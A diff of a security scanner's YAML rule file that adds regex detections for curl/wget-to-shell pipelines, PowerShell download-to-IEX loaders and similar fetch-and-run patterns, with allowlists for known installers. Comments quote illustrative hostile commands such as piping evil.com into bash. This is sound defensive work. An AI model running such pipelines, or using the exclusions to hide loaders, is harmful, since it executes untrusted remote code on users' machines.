@@ -21,30 +21,88 @@ traits:
 # (that duplicate had accumulated eight per-vendor exclusions and bob-nvim would
 # have been the ninth). The intent lives in the composites that pair this with an
 # MSI download, an install hook, or an execution site.
-- id: curl-pipe-shell-text
-  desc: References a curl- or wget-to-shell pipeline
+# Hardening notes name a textbook host (`curl evil.sh | sh`,
+# `curl http://evil.com | bash`) for the pipeline they refuse. The host
+# is not one a loader fetches; curl-pipe-shell-text still reports the
+# pipeline itself.
+- id: illustrative-evil-pipe
+  desc: Pipeline fetches from illustrative evil host
   crit: notable
   conf: 0.9
   for: [scripts, source, markdown, html]
+  if:
+    type: text
+    regex: '(?i)(curl|wget)\s+[^|\n]{0,80}\bevil[^|\n]{0,30}\|\s*(sh|bash|zsh)'
+
+- id: illustrative-example-pipe
+  desc: Shell pipeline fetches from example domain
+  crit: notable
+  conf: 0.9
+  for: [scripts, source, markdown, html]
+  if:
+    type: text
+    regex: '(?i)(curl|wget)\s+[^|\n]{0,80}\b(example\.[a-z]{3}|\w+\.invalid)[^|\n]{0,30}\|'
+
+# Raw-text surface of the pipeline, for the file types the string-literal
+# surface (curl-pipe-shell-literal) does not cover. On those languages the
+# text surface would only add comments; curl-pipe-shell-text joins the
+# surfaces. Ruby stays here: heredoc bodies (formula caveats, embedded plists)
+# are not on the literal surface. (`typescript` in a for: list resolves to
+# javascript, so TypeScript files are not literal-covered either.)
+- id: curl-pipe-shell-raw-text
+  desc: Text holds a curl-to-shell pipeline
+  crit: notable
+  conf: 0.9
+  for: [scripts, source, markdown, html, -python, -javascript, -go, -rust, -php, -java]
   attack: T1059.004
   unless:
-    - id: well-known/tool/detection/llm-scanner::llm-scanner-context
-    - id: well-known/tool/detection/agentskillmap/
-    # Security playbook / attack writeups citing known-bad or illustrative hosts
-    - type: text
-      regex: '(?i)https?://(attacker\.com|hackmoltrepeat\.com)/'
-    - type: text
-      regex: '(?i)Actions That curl\s*\|\s*bash'
-    - id: well-known/tool/development/clawgarden::clawgarden-cli-context
+  # Security playbook / attack writeups citing known-bad or illustrative hosts
+  - type: text
+    regex: '(?i)https?://(attacker\.com|hackmoltrepeat\.com)/'
+  - type: text
+    regex: '(?i)Actions That curl\s*\|\s*bash'
   if:
     type: text
     # macOS ClickFix loaders pipe into zsh as often as bash/sh.
     regex: '(curl|wget)\s+.{0,160}\|\s*(bash|zsh|sh)\b'
   not:
   - regex: '(curl|wget)\s+\.{3}\s*\|\s*(bash|zsh|sh)\b'
+  - substr: yarnpkg.com/install.sh
+  - substr: YARN_INSTALLER_SH
   - regex: '(curl|wget)\s+.{0,200}get\.docker\.com.{0,200}\|\s*(bash|zsh|sh)\b'
   - regex: '(curl|wget)\s+.{0,200}deb\.nodesource\.com/.{0,80}\|\s*(bash|zsh|sh)\b'
   - regex: '(curl|wget)\s+.{0,200}cli\.oomol\.com/install\.sh.{0,40}\|\s*(bash|zsh|sh)\b'
+  - regex: '(curl|wget)\s+.{0,200}install\.julialang\.org.{0,200}\|\s*(bash|zsh|sh)\b'
+  - regex: '(curl|wget)\s+.{0,200}nixos\.org/nix/install.{0,200}\|\s*(bash|zsh|sh)\b'
+  - regex: '(curl|wget)\s+.{0,200}cursor\.com/install.{0,200}\|\s*(bash|zsh|sh)\b'
+# The Windows counterpart of curl-pipe-shell-text, in the browser/clipboard
+# context: PowerShell downloads a remote script and pipes it straight into
+# Invoke-Expression. This is the dominant Windows ClickFix loader form, which
+# the curl/sh pattern above never matched. Broader than the CLI-oriented
+# embedded-iwr-pipe-iex (it also spans the full Invoke-WebRequest/RestMethod
+# spellings, Invoke-Expression, and html) so the clipboard-pipeline composite
+# can convict it. Piping a web response into IEX has no benign form; intent
+# comes from the composites (clipboard, OS gate, passive trigger) referencing it.
+- id: powershell-webrequest-to-iex-pipeline
+  desc: PowerShell pipes web download to IEX
+  crit: notable
+  conf: 0.92
+  for: [scripts, source, markdown, html]
+  attack: T1059.001
+  if:
+    type: text
+    regex: '(?i)(iwr|irm|Invoke-WebRequest|Invoke-RestMethod)\b.{0,80}\|\s*(iex|Invoke-Expression)\b'
+# The DownloadString form of the same loader: IEX evaluates a web fetch instead
+# of piping it. No micro-behaviors capability atom covered this shape before.
+- id: powershell-downloadstring-iex-inline
+  desc: IEX runs a DownloadString web fetch
+  crit: notable
+  conf: 0.92
+  for: [scripts, source, markdown, html]
+  attack: T1059.001
+  if:
+    type: text
+    regex: '(?i)(iex|Invoke-Expression)[^\r\n]{0,40}DownloadString\s*\('
 - id: source-curl-pipe-shell-concat
   desc: Source concatenates curl-to-shell pipeline
   crit: notable
@@ -79,6 +137,23 @@ traits:
     any:
     - id: micro-behaviors/os/package-manager/installer-script::install-script-pipe
     - id: micro-behaviors/os/package-manager/installer-script::getter-script-pipe
+  unless:
+    - id: metadata/file/format/structured::serialized-news-article-catalog
+- id: shell-stdin-interpreter-pipe
+  desc: Pipes data into a zsh/ksh/sh stdin interpreter
+  crit: notable
+  conf: 0.9
+  attack: T1059.004
+  # `bash -s` is covered by bash-stdin-pipe above; match the other interpreters
+  # that read a command stream from stdin (`... | zsh -s`, `... | /bin/zsh -s`).
+  # The optional path prefix is the form a JXA carrier uses when it pipes a
+  # decoded payload into zsh without writing a script to disk.
+  for: [shell, javascript, applescript, python]
+  if:
+    type: text
+    regex: '\|\s*(/(usr/)?bin/)?(zsh|ksh|sh)\s+-s\b'
+  unless:
+    - id: metadata/file/format/structured::serialized-news-article-catalog
 - id: python-curl-pipe-bash-string
   desc: Python string contains curl-to-Bash command
   crit: notable
@@ -128,16 +203,92 @@ traits:
   - regex: 'curl\s+-LsSf\s+\.\.\.\s*\|\s*sh\b'
   - regex: 'curl\s+.{0,80}\{UV_INSTALL_URL\}\s*\|\s*sh\b'
   - regex: 'curl\s+.{0,200}get\.docker\.com.{0,200}\|\s*sh\b'
+  - regex: 'curl\s+.{0,200}cursor\.com/install.{0,200}\|\s*sh\b'
   unless:
+  - id: metadata/file/format/structured::serialized-news-article-catalog
   - id: well-known/tool/detection/security-scanner::auditr-defensive-signature-catalog
   - id: well-known/tool/detection/docksec::docksec-scanner-context
   - id: well-known/tool/packaging/uv::uv-install-sh-bootstrap-url
   - id: well-known/tool/detection/scarno::scarno-defensive-catalog-source
   # Rnix-parser exposes the official Nix bootstrap command in a user-facing
   # upgrade error.  Quoting that command is not an execution behavior.
+  - id: well-known/tool/packaging/nix::nixos-install-script-url
+# The pipeline as a string constant the program holds, parsed out of the
+# source: comments and documentation are not literals, so a README-style
+# `curl … | sh` in a comment never counts as something the code can run.
+- id: curl-pipe-shell-literal
+  desc: String literal holds a curl-to-shell pipeline
+  crit: notable
+  conf: 0.93
+  for: [python, javascript, typescript, go, rust, php, java]
+  attack: T1059.004
+  unless:
+  # Security playbook / attack writeups citing known-bad or illustrative hosts
   - type: text
-    regex: '(?i)nixos\.org/nix/install'
+    regex: '(?i)https?://(attacker\.com|hackmoltrepeat\.com)/'
+  - type: text
+    regex: '(?i)Actions That curl\s*\|\s*bash'
+  if:
+    type: literal
+    regex: '(curl|wget)\s+.{0,160}\|\s*(bash|zsh|sh)\b'
+  not:
+  # Both the ASCII ("curl ... | bash") and single-character ("curl … | bash")
+  # ellipsis are documentation placeholders for an elided URL, not a pipeline
+  # the code can run. A docstring explaining the one-liner install path next
+  # to an exec call is prose, not a spawned pipeline.
+  - regex: '(curl|wget)\s+(\.{3}|…)\s*\|\s*(bash|zsh|sh)\b'
+  - substr: yarnpkg.com/install.sh
+  - substr: YARN_INSTALLER_SH
+  - regex: '(curl|wget)\s+.{0,200}get\.docker\.com.{0,200}\|\s*(bash|zsh|sh)\b'
+  - regex: '(curl|wget)\s+.{0,200}deb\.nodesource\.com/.{0,80}\|\s*(bash|zsh|sh)\b'
+  - regex: '(curl|wget)\s+.{0,200}cli\.oomol\.com/install\.sh.{0,40}\|\s*(bash|zsh|sh)\b'
+  - regex: '(curl|wget)\s+.{0,200}install\.julialang\.org.{0,200}\|\s*(bash|zsh|sh)\b'
+  - regex: '(curl|wget)\s+.{0,200}nixos\.org/nix/install.{0,200}\|\s*(bash|zsh|sh)\b'
+  - regex: '(curl|wget)\s+.{0,200}cursor\.com/install.{0,200}\|\s*(bash|zsh|sh)\b'
+# A `//go:generate` directive is a comment the go tool executes, so it is the
+# one comment form that holds a runnable pipeline in Go source.
+- id: go-generate-curl-pipe-shell-directive
+  desc: go:generate directive pipes download into shell
+  crit: notable
+  conf: 0.95
+  for: [go]
+  platforms: [unix, windows]
+  attack: T1059.004
+  if:
+    type: value
+    path: source.go.generate[*].shell_body
+    regex: '\b(curl|wget)\b[^\n]{0,512}\|\s*(ba|da|z)?sh\b'
+# Windows counterpart: the response is fed to cmd.exe's stdin and every line
+# runs as a batch command. Installers use `irm | iex` or a downloaded .msi,
+# not this.
+- id: curl-pipe-cmd-literal
+  desc: Literal pipes curl or wget into cmd
+  crit: notable
+  conf: 0.93
+  for: [python, javascript, typescript, go, rust, ruby, php, java]
+  platforms: [windows]
+  attack: T1059.003
+  if:
+    type: literal
+    regex: '(?i)(curl|wget)(\.exe)?\s.{0,160}\|\s*cmd(\.exe)?\b'
 composite_rules:
+  # One curl-to-shell pipeline fact across surfaces: raw text where no parser
+  # applies, string literals (comments excluded) where one does, and go:generate
+  # directives, the comment form Go actually runs.
+  - id: curl-pipe-shell-text
+    desc: References a curl- or wget-to-shell pipeline
+    crit: notable
+    conf: 0.9
+    for: [scripts, source, markdown, html]
+    attack: T1059.004
+    unless:
+      - id: well-known/tool/detection/llm-scanner::llm-scanner-context
+      - id: well-known/tool/detection/agentskillmap/
+      - id: well-known/tool/development/clawgarden::clawgarden-cli-context
+    any:
+      - id: curl-pipe-shell-raw-text
+      - id: curl-pipe-shell-literal
+      - id: go-generate-curl-pipe-shell-directive
   - id: source-curl-pipe-shell
     desc: Source contains a curl-to-shell pipeline
     crit: notable
@@ -196,6 +347,29 @@ composite_rules:
     any:
       - id: micro-behaviors/process/create/shell/command-mode::shell-c-command-substitution-fetch
       - id: curl-pipe-shell-text
+      - id: powershell-webrequest-to-iex-pipeline
+      - id: powershell-downloadstring-iex-inline
     unless:
       - id: metadata/build/recognized-contexts::vscode-webview-codeblock-copy-button
       - id: well-known/app/ai/coding-agent/grok-cli::official-installer-url
+
+  # A curl-to-shell pipeline the code itself holds: one string constant, or
+  # the command and URL split across concatenated literals.
+  - id: curl-pipe-shell-in-code
+    desc: Code holds a curl-to-shell pipeline
+    conf: 0.93
+    # Legs cover python/javascript/ruby/php/perl as well as compiled source.
+    for: [scripts, source]
+    any:
+      - id: curl-pipe-shell-literal
+      - id: source-curl-pipe-shell-concat
+
+  - id: illustrative-evil-host-pipe
+    desc: Illustrative evil-host shell pipeline
+    crit: notable
+    conf: 0.9
+    for: [scripts, source, markdown, html]
+    any:
+      - id: illustrative-evil-pipe
+      - id: illustrative-example-pipe
+
